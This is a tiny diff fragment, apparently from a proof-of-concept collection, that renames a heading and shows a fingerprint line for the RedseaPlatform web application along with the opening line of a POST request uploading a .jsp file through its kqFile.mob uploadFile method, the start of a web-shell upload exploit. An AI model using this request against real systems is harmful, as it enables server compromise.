@@ -8,7 +8,7 @@
 body="/RedseaPlatform/skins/images/favicon.ico"
 ```
 
-## poc
+## POC
 
 ```yaml
 POST /RedseaPlatform/kqFile.mob?method=uploadFile&fileName=fbjgrohu.jsp HTTP/1.1
